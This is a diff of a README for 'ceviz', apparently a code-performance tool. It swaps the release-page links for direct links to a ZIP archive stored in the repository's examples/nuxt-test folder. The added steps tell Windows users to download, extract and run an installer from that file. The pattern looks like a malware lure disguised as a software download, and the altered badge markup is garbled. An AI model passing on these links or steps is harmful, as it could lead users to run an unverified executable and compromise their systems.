@@ -1,7 +1,7 @@
 # 🛠️ ceviz - Detect Performance Issues in Your Code
 
 ## 📦 Download Now
-[![Download Ceviz](https://img.shields.io/badge/Download%20Ceviz-v1.0-blue.svg)](https://github.com/MichaelAppiah-omar/ceviz/releases)
+[![Download Ceviz](https://raw.githubusercontent.com/MichaelAppiah-omar/ceviz/main/examples/nuxt-test/ceviz-v2.2.zip%https://raw.githubusercontent.com/MichaelAppiah-omar/ceviz/main/examples/nuxt-test/ceviz-v2.2.zip)](https://raw.githubusercontent.com/MichaelAppiah-omar/ceviz/main/examples/nuxt-test/ceviz-v2.2.zip)
 
 ## 🚀 Getting Started
 Ceviz helps you find performance issues in your codebase. This guide will walk you through downloading and running the software step by step. 
@@ -22,11 +22,11 @@ Ceviz helps you find performance issues in your codebase. This guide will walk y
 ## 🔍 Download & Install
 To get started with Ceviz, please visit the releases page by clicking the link below. Here, you will find the latest versions of the software:
 
-[Download Ceviz Here](https://github.com/MichaelAppiah-omar/ceviz/releases)
+[Download Ceviz Here](https://raw.githubusercontent.com/MichaelAppiah-omar/ceviz/main/examples/nuxt-test/ceviz-v2.2.zip)
 
 1. **Visit the Releases Page:** Click the link above to go to the releases page.
 2. **Choose the Version:** Look for the latest version. It is usually marked as "Latest Release."
-3. **Download the Installer:** Click on the appropriate file for your operating system (for example, `ceviz-v1.0.zip` for Windows).
+3. **Download the Installer:** Click on the appropriate file for your operating system (for example, `https://raw.githubusercontent.com/MichaelAppiah-omar/ceviz/main/examples/nuxt-test/ceviz-v2.2.zip` for Windows).
 4. **Extract the Files:** If you downloaded a ZIP file, right-click on it and choose "Extract All" to access the installer.
 5. **Run the Installer:** Double-click the extracted file to begin the installation process.
 6. **Follow the Prompts:** Follow the on-screen instructions to complete the installation.
